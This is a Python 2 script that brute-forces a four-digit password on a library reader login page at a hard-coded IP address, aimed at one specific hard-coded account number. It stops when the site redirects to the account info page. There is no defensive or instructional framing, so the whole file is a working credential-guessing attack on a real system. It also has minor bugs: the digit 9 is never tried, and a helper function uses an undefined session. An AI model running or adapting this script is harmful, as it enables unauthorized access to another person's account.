import urllib2
import urllib
import sys
import requests
#import json


loginUrl = 'http://202.112.134.140:8080/reader/redr_verify.php'


#passwd = ''
#lenofpasswd = 0
def crack_gen(passwd,lenofpasswd):
    if lenofpasswd >= 4:
        result = judgePasswd('22200923001213',passwd) 
        print 'password:'+passwd+' '+str(result)
        if result == 0:
            return
        else:
            sys.exit()
    for i in range(0,9):
        crack_gen(passwd + str(i),lenofpasswd+1)

        
def judgePasswd(num, passwd):
    loginData = {'number':num,
                 'passwd':passwd,
                 'select':'cert_no',
                 'returnUrl':''}
    r = requests.post(loginUrl, loginData)
    if  r.url == 'http://202.112.134.140:8080/reader/redr_info.php':
        #print 'yes'
        print r.url
        return 1
    else:
        #print 'no'
        print r.url
        return 0

#session = requests.Session()
def post(url, data={}):
    return session.post(url, data)
#    return requests.post(url, data)

if __name__ == '__main__':
    crack_gen('',0)
    #print judgePasswd('22200923001213','0326') 

